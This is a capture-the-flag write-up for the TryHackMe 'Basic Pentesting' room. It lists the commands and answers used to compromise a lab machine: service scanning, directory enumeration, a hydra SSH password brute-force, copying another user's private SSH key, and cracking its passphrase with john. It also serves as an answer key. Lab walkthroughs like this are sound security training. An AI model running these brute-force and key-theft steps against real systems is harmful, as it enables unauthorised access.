# TryHackMe challenge

## Basic Pentesting

> _tihawk | May 17, 2021_

----------------------------------------

### TASK 1. Web App Testing and Privilege Escalation 

<p>In these set of tasks you'll learn the following:</p><ul><li>brute forcing </li><li>hash cracking </li><li>service enumeration</li><li>Linux Enumeration</li></ul><p>The main goal here is to learn as much as possible. Make sure you are connected to our network using your <a href="https://tryhackme.com/access">OpenVPN configuration file</a>.</p><p>Credits to <a href="https://www.vulnhub.com/author/josiah-pierce,569/" target="_blank">Josiah Pierce</a> from Vulnhub.</p>

----------------------------------------

### QUESTIONS:

----------------------------------------

```
export IP=10.10.192.235
```

1. Deploy the machine and connect to our network

```
OK
```

2. Find the services exposed by the machine

```
nmap -sC -sV -oN nmap/initial -vvv $IP
```

```
OK
```

3. What is the name of the hidden directory on the web server(enter name without /)?

```
gobuster dir -u http://$IP -w /opt/directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.192.235
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /opt/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/05/17 20:40:12 Starting gobuster in directory enumeration mode
===============================================================
/development          (Status: 301) [Size: 320] [--> http://10.10.192.235/development/]
```

```
development
```

4. User brute-forcing to find the username &amp; password

```
OK
```

5. What is the username? 

```
enum4linux -a $IP | tee enum.log
```

```
S-1-22-1-1000 Unix User\kay (Local User)
S-1-22-1-1001 Unix User\jan (Local User)
```

```
jan
```

6. What is the password?

```
hydra -l jan -P /opt/rockyou.txt ssh://$IP
```

```
armando
```

7. What service do you use to access the server(answer in abbreviation in all caps)?

```
SSH
```

8. Enumerate the machine to find any vectors for privilege escalation 

```
scp /opt/linpeas.sh jan@$IP:/dev/shm/
```

> Linpeas gives us the information about a private ssh key, but honestly we already should have known that.

```
OK
```

9. What is the name of the other user you found(all lower case)?

```
kay
```

10. If you have found another user, what can you do with this information? 

```
scp jan@$IP:/home/kay/.ssh/* ./kay_ssh/
chmod 600 id_rsa
python2 /usr/bin/ssh2john id_rsa > forjohn.txt
john --wordlist=/opt/rockyou.txt forjohn.txt 

beeswax

ssh -i id_rsa kay@$IP
cat pass.bak
```

```
OK
```

11. What is the final password you obtain?

```
heresareallystrongpasswordthatfollowsthepasswordpolicy$$
```

